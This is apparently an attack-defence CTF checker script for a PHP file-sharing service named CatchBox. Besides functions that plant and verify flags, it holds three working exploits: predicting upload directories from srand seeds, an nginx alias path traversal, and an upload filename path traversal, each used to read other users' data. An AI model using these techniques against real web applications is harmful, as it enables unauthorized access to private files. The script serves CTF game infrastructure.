from bs4 import BeautifulSoup

from enochecker3 import (
    ChainDB,
    DependencyInjector,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_in, assert_equals

import dateutil.parser

from httpx import AsyncClient, Response

from hashlib import md5

from logging import LoggerAdapter

from subprocess import Popen, PIPE

import string

from typing import Any, Optional

import random

import os

checker = Enochecker("CatchBox", 9090)
app = lambda: checker.app

random.seed(int.from_bytes(os.urandom(16), "little"))

noise_alph = string.ascii_letters + string.digits
def noise(nmin: int, nmax: int) -> str:
    n = random.randint(nmin, nmax)
    return "".join(random.choice(noise_alph) for _ in range(n))

def filehash(user: str, file: str, seed: int) -> str:
    code = f"<?php srand({seed}); echo md5('{user}'.'{file}'.strval(rand())); ?>"
    with Popen("php", stdin=PIPE, stdout=PIPE) as php:
        return php.communicate(code.encode())[0].strip().decode()

def str2epoch(text: str) -> int:
    date = dateutil.parser.parse(text + " UTC")
    return int(date.timestamp())

def parse_html(logger: LoggerAdapter, r: Response) -> BeautifulSoup:
    try:
        return BeautifulSoup(r.text, "html.parser")
    except:
        logger.error(f"Invalid html from {r.request.method} {r.request.url.path}\n" \
            + r.text)
        raise MumbleException(f"Invalid html ({r.request.method} {r.request.url.path})")

def assert_status_code(logger: LoggerAdapter, r: Response,
        code: int, errmsg: Optional[str], extra: Any = "") -> None:
    if r.status_code != code:
        logger.error(f"Bad service response for " \
            + f"{r.request.method} {r.request.url.path}:\n" \
            + f"Extra info: {str(extra)}\n{r.text}")
        if errmsg is None:
            errmsg = f"{r.request.method} {r.request.url.path} failed"
        raise MumbleException(errmsg)

@checker.putflag(0)
async def putflag_file(task: PutflagCheckerTaskMessage, logger: LoggerAdapter,
        client: AsyncClient, db: ChainDB) -> str:
    username, password = noise(10, 20), noise(20, 30)
    data = { "action": "register", "username": username, "password": password }
    r = await client.post("/index.php", data=data)
    assert_status_code(logger, r, 200, "Register failed", extra=data)

    filename, content = noise(20, 30), task.flag
    data = { "action": "upload", "filename": filename, "content": content }
    r = await client.post("/index.php", data=data)
    assert_status_code(logger, r, 200, "File upload", extra=data)

    await db.set("info", (username, password, filename))

    return f"User {username} File {filename}"

@checker.getflag(0)
async def getflag_file(task: GetflagCheckerTaskMessage,
        logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    try:
        username, password, filename = await db.get("info")
    except KeyError:
        raise MumbleException("database info missing")

    data = { "action": "login", "username": username, "password": password }
    r = await client.post("/index.php", data=data)
    assert_status_code(logger, r, 200, "Login failed", extra=data)

    r = await client.get(f"/index.php?f={filename}")
    assert_status_code(logger, r, 200, "File download failed", extra=filename)

    assert_in(task.flag, r.text, "Flag missing")

@checker.putflag(1)
async def putflag_report(task: PutflagCheckerTaskMessage,
        logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> str:
    username, password = noise(10, 20), noise(20, 30)
    data = { "action": "register", "username": username, "password": password }
    r = await client.post("/index.php", data=data)
    assert_status_code(logger, r, 200, "Register failed", extra=data)

    data = { "action": "report", "content": task.flag }
    r = await client.post("/index.php", data=data)
    assert_status_code(logger, r, 200, "Upload failed", extra=data)

    await db.set("info", (username, password))

    return f"User {username} Report"

@checker.getflag(1)
async def getflag_report(task: GetflagCheckerTaskMessage,
        logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    try:
        username, password = await db.get("info")
    except KeyError:
        raise MumbleException("Database info missing")

    data = { "action": "login", "username": username, "password": password }
    r = await client.post("/index.php", data=data)
    assert_status_code(logger, r, 200, "Login failed", extra=data)

    r = await client.get(f"/index.php?r")
    assert_status_code(logger, r, 200, "Report download failed")

    assert_in(task.flag, r.text, "Flag missing")

@checker.putnoise(0)
async def putnoise_file(task: PutnoiseCheckerTaskMessage,
        logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    username, password = noise(10, 20), noise(20, 30)
    data = { "action": "register", "username": username, "password": password }
    r = await client.post("/index.php", data=data)
    assert_status_code(logger, r, 200, "Register failed", extra=data)

    filename, content = noise(20, 30), noise(20, 30)
    data = { "action": "upload", "filename": filename, "content": content }
    r = await client.post("/index.php", data=data)
    assert_status_code(logger, r, 200, "File upload failed", extra=data)

    await db.set("info", (username, password, filename, content))

@checker.getnoise(0)
async def getnoise_file(task: GetnoiseCheckerTaskMessage,
        logger: LoggerAdapter, client: AsyncClient,
        db: ChainDB, di: DependencyInjector) -> None:
    try:
        username, password, filename, noise = await db.get("info")
    except KeyError:
        raise MumbleException("database info missing")

    data = { "action": "login", "username": username, "password": password }
    r = await client.post("/index.php", data=data)
    assert_status_code(logger, r, 200, "Login failed", extra=data)

    r = await client.get("/index.php?q=files")
    assert_status_code(logger, r, 200, "Files query failed")

    soup = parse_html(logger, r)
    files = [v.select("a") for v in soup.select("ul.filelist > li")]
    assert_equals(all([len(v) == 2 for v in files]), True, "noise missing")

    urls = { a.text.strip(): b.get("href", None) for a,b in files }
    assert_in(filename, urls, "Noise missing")
    assert_equals(type(urls[filename]), str, "noise missing")

    r = await client.get(f"/index.php?f={filename}")
    assert_status_code(logger, r, 200, "File download failed", extra=filename)
    assert_in(noise, r.text, "Noise missing")

    anon = await di.get(AsyncClient)
    r = await anon.get(urls[filename])
    assert_status_code(logger, r, 200, "Public url invalid",
        extra={"filename": filename, "url": urls[filename]})
    assert_in(noise, r.text, "Noise missing")

@checker.exploit(0)
async def exploit_file_creat(task: ExploitCheckerTaskMessage,
        logger: LoggerAdapter, searcher: FlagSearcher,
        client: AsyncClient) -> Optional[str]:
    assert_equals(type(task.attack_info), str, "attack info missing")

    assert_equals(len(task.attack_info.split()), 4)
    _, flaguser, _, flagfile = task.attack_info.split()

    r = await client.get("/?q=users")
    assert_status_code(logger, r, 200, "Users listing failed")

    soup = parse_html(logger, r)
    users = [v.children for v in soup.select("ul.userlist > li")]
    times = { a.text.strip(): str2epoch(b.text.strip()) for a,b in users }

    assert_in(flaguser, times, "Flag user missing")
    for creat in range(times[flaguser], times[flaguser] + 15):
        dirname = filehash(flaguser, flagfile, creat)
        r = await client.get(f"/uploads/{dirname}/{flagfile}")
        if flag := searcher.search_flag(r.text):
            return flag

@checker.exploit(1)
async def exploit_report_nginx(task: ExploitCheckerTaskMessage,
        logger: LoggerAdapter, searcher: FlagSearcher,
        client: AsyncClient) -> Optional[str]:
    assert_equals(type(task.attack_info), str, "attack info missing")
    assert_equals(len(task.attack_info.split()), 3, "attack info invalid")

    _, flaguser, _ = task.attack_info.split()
    reportfile = md5(flaguser.encode()).hexdigest()

    r = await client.get(f"/uploads../reports/{reportfile}")
    if flag := searcher.search_flag(r.text):
        return flag

@checker.exploit(2)
async def exploit_report_path(task: ExploitCheckerTaskMessage,
        logger: LoggerAdapter, searcher: FlagSearcher,
        client: AsyncClient) -> Optional[str]:
    assert_equals(type(task.attack_info), str, "attack info missing")
    assert_equals(len(task.attack_info.split()), 3, "attack info invalid")

    _, flaguser, _ = task.attack_info.split()
    reportfile = md5(flaguser.encode()).hexdigest()

    username, password = noise(10, 20), noise(20, 30)
    data = { "action": "register", "username": username, "password": password }
    r = await client.post("/index.php", data=data)
    assert_status_code(logger, r, 200, "Register failed", extra=data)

    filepath = f"../../reports/{reportfile}"
    data = { "action": "upload", "filename": filepath, "content": "exploit2!" }
    r = await client.post("/index.php", data=data)
    assert_status_code(logger, r, 200, "Path traversal", extra=data)

    r = await client.get(f"/index.php?f={filepath}")
    if flag := searcher.search_flag(r.text):
        return flag

if __name__ == "__main__":
    checker.run()

